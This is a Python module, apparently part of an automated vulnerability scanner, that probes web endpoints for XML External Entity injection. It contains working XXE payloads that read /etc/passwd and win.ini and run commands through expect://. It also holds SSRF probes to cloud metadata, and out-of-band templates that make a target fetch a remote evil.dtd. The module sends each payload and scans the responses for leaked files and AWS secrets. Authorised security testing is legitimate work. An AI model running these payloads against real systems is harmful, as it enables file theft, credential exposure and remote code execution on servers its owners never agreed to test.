"""
XLayer AI XXE Hunter - XML External Entity Injection
Detects XXE in XML-accepting endpoints, file uploads (SVG, DOCX, XLSX),
and SOAP services. Supports file read, SSRF, and blind OOB detection.
"""

import re
import time
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)


# ─── File Read Payloads ───────────────────────────────────────────────────────
XXE_FILE_PAYLOADS = [
    # Linux /etc/passwd
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Linux /etc/hostname
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><data>&xxe;</data></root>""",

    # Windows win.ini
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>""",

    # PHP filter wrapper (when direct file read filtered)
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Expect wrapper (RCE via XXE)
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>""",
]

# ─── SSRF via XXE ─────────────────────────────────────────────────────────────
XXE_SSRF_PAYLOADS = [
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",

    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<root><data>&xxe;</data></root>""",
]

# ─── Blind OOB XXE (replace OOB_HOST at runtime) ─────────────────────────────
XXE_OOB_TEMPLATE = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{oob_host}/xxe-probe">
  %xxe;
]>
<root><data>test</data></root>"""

XXE_PARAMETER_ENTITY_OOB = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{oob_host}/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>"""

# ─── Error Patterns ───────────────────────────────────────────────────────────
XXE_SUCCESS_PATTERNS = [
    r"root:x:0:0",                          # /etc/passwd Linux
    r"daemon:x:\d+:\d+",
    r"\[boot loader\]",                     # win.ini
    r"extensions\s*=",                      # win.ini
    r"127\.0\.0\.1\s+localhost",            # /etc/hosts
    r"AWS_SECRET_ACCESS_KEY",               # AWS metadata
    r"ami-id",                              # AWS EC2 metadata
    r"hostname",                            # hostname file
]

XXE_ERROR_PATTERNS = [
    r"XML.*parsing.*error",
    r"SAXParseException",
    r"XMLSyntaxError",
    r"entity.*not.*defined",
    r"SYSTEM.*identifier",
    r"DOCTYPE.*not.*allowed",
    r"external.*entity",
    r"org\.xml\.sax",
    r"javax\.xml",
    r"lxml\.etree",
    r"System\.Xml",
]

# ─── XML Content Types ────────────────────────────────────────────────────────
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/x-www-form-urlencoded",  # some apps parse XML from POST body
    "application/soap+xml",
    "application/xhtml+xml",
]


class XXEHunter(BaseHunter):
    """
    XML External Entity Injection Hunter.

    Detection strategy:
    1. Identify XML-accepting endpoints (Content-Type, file upload, SOAP)
    2. Inject file-read XXE → check for /etc/passwd content
    3. Inject SSRF XXE → check for internal service response
    4. Error-based: detect XML parser error messages
    5. OOB: inject callback URL → wait for DNS/HTTP hit
    """

    name = "xxe"
    vuln_types = [VulnType.XXE]

    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        start_time = time.time()
        self._reset_state()

        logger.info(f"XXE Hunter starting on {len(attack_surface.testable_endpoints)} endpoints")

        for endpoint in attack_surface.testable_endpoints:
            # Test XML body injection
            if self._accepts_xml(endpoint):
                await self._test_xxe_body(endpoint)

            # Test individual parameters that might pass XML
            for param in endpoint.parameters:
                await self._test_xxe_param(endpoint, param.name, attack_surface)

        duration = time.time() - start_time
        result = self._build_result(duration)
        logger.info(f"XXE Hunter complete: {result.findings_count} hypotheses")
        return result

    def _accepts_xml(self, endpoint: Endpoint) -> bool:
        """Check if endpoint likely accepts XML input."""
        url_lower = endpoint.url.lower()
        # SOAP, XML-specific endpoints
        if any(k in url_lower for k in ["soap", "xml", "wsdl", "api", "service"]):
            return True
        # POST endpoints more likely to accept XML body
        if endpoint.method.value.upper() == "POST":
            return True
        return False

    async def _test_xxe_body(self, endpoint: Endpoint):
        """Test endpoint by sending full XML body with XXE payload."""
        self._endpoints_tested += 1

        for payload in XXE_FILE_PAYLOADS:
            self._payloads_sent += 1
            try:
                # Send as XML body
                if endpoint.method.value.upper() == "GET":
                    response = await self._send_xml_get(endpoint, payload)
                else:
                    response = await self._send_xml_post(endpoint, payload)

                if not response:
                    continue

                body = response.get("body", "")

                # Check for file content
                for pattern in XXE_SUCCESS_PATTERNS:
                    match = re.search(pattern, body, re.IGNORECASE)
                    if match:
                        h = self._create_hypothesis(
                            vuln_type=VulnType.XXE,
                            endpoint=endpoint,
                            parameter="(xml_body)",
                            confidence=Confidence.HIGH,
                            indicators=[
                                VulnIndicator(
                                    indicator_type="file_read",
                                    detail=f"File content in response: '{match.group(0)[:60]}'",
                                    confidence_boost=0.45,
                                )
                            ],
                            suggested_payloads=XXE_FILE_PAYLOADS[:2] + XXE_SSRF_PAYLOADS[:1],
                            context={
                                "injection_type": "xxe_file_read",
                                "trigger_payload": payload[:100],
                                "evidence": match.group(0)[:100],
                            },
                        )
                        self._hypotheses.append(h)
                        return

                # Check for XML parser errors (indicates XML is being parsed)
                for pattern in XXE_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        h = self._create_hypothesis(
                            vuln_type=VulnType.XXE,
                            endpoint=endpoint,
                            parameter="(xml_body)",
                            confidence=Confidence.MEDIUM,
                            indicators=[
                                VulnIndicator(
                                    indicator_type="xml_error",
                                    detail="XML parser error detected — XML input is being processed",
                                    confidence_boost=0.15,
                                )
                            ],
                            suggested_payloads=XXE_FILE_PAYLOADS[:2],
                            context={
                                "injection_type": "xxe_error_based",
                                "trigger_payload": payload[:100],
                            },
                        )
                        self._hypotheses.append(h)
                        return

            except Exception as e:
                self._errors.append(f"XXE body test error: {e}")

    async def _test_xxe_param(
        self, endpoint: Endpoint, parameter: str, attack_surface: AttackSurface
    ):
        """Test a parameter for XXE using adaptive engine (file read + error fingerprint)."""
        self._endpoints_tested += 1

        ctx = self._build_attack_context(endpoint, parameter, "xxe", attack_surface)

        def xxe_success(send_result, attack_ctx):
            body = send_result.body
            # Direct file-read evidence (highest confidence)
            for pattern in XXE_SUCCESS_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return True
            # XML parser error → confirms XML is being parsed
            for pattern in XXE_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return True
            return False

        # Static payloads: file-read XXE + simple entity probe
        xml_probe = '<?xml version="1.0"?><test>&xxe;</test>'
        static_payloads = list(XXE_FILE_PAYLOADS) + [xml_probe]

        attempts = await self._adaptive_test(
            endpoint, parameter, static_payloads, ctx, xxe_success,
        )

        for attempt in attempts:
            if not attempt.success:
                continue

            body = attempt.response_body
            # Determine confidence from evidence type
            is_file_read = any(
                re.search(p, body, re.IGNORECASE) for p in XXE_SUCCESS_PATTERNS
            )
            confidence = Confidence.HIGH if is_file_read else Confidence.LOW

            h = self._create_hypothesis(
                vuln_type=VulnType.XXE,
                endpoint=endpoint,
                parameter=parameter,
                confidence=confidence,
                indicators=[
                    VulnIndicator(
                        indicator_type="file_read" if is_file_read else "xml_parse_error",
                        detail=(
                            "File content in response" if is_file_read
                            else "Parameter value parsed as XML (error leaked)"
                        ),
                        confidence_boost=0.4 if is_file_read else 0.1,
                    )
                ],
                suggested_payloads=XXE_FILE_PAYLOADS[:2],
                context={
                    "injection_type": "xxe_param",
                    "trigger_payload": attempt.payload[:100],
                    "waf_bypassed": ctx.waf,
                },
            )
            self._hypotheses.append(h)
            return

    async def _send_xml_post(self, endpoint: Endpoint, xml_body: str) -> Optional[Dict]:
        """Send POST request with XML content-type body."""
        try:
            response = await self.http.post(
                endpoint.url,
                data=xml_body,
                headers={"Content-Type": "application/xml"},
            )
            return {
                "status": response.status,
                "headers": response.headers,
                "body": response.body,
                "elapsed_ms": response.elapsed_ms,
                "error": response.error,
            }
        except Exception as e:
            logger.debug(f"XXE XML POST failed: {e}")
            return None

    async def _send_xml_get(self, endpoint: Endpoint, xml_body: str) -> Optional[Dict]:
        """Send GET request with XML in body (some APIs accept this)."""
        try:
            import urllib.parse
            encoded = urllib.parse.quote(xml_body)
            url = f"{endpoint.url}?xml={encoded}"
            response = await self.http.get(url)
            return {
                "status": response.status,
                "headers": response.headers,
                "body": response.body,
                "elapsed_ms": response.elapsed_ms,
                "error": response.error,
            }
        except Exception as e:
            logger.debug(f"XXE XML GET failed: {e}")
            return None

    def _analyze_response(self, endpoint, parameter, payload, response):
        return None
